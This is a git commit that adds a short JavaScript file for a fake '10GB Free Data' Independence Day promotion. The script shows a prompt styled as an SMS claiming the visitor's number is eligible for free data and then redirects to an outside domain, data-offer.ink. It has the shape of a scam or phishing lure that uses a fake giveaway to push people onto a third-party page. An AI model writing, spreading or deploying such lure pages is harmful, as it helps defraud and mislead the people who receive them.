2deaf2f99dc2764e2165217673093e051895ec8e
katemj25 <mbokofficial1@gmail.com>
2025-04-17 18:21:39 -0700

    Create activate10gb-independence-freedata.com.js

---
+++ activate10gb-independence-freedata.com.js
@@ -0,0 +1,5 @@
+var password = '10GB Free Data'
+password=prompt('SMS: Congratulations Your Number is Eligible to receive 10GB Free Data 2025 Idependence Day Celebration, Kindly Press OK to ACTIVATE. ','10GB Free Data');
+if (password != '10GB Free Data') {
+location.href='https://data-offer.ink/activate10gb-independence-freedata.com.html';
+}
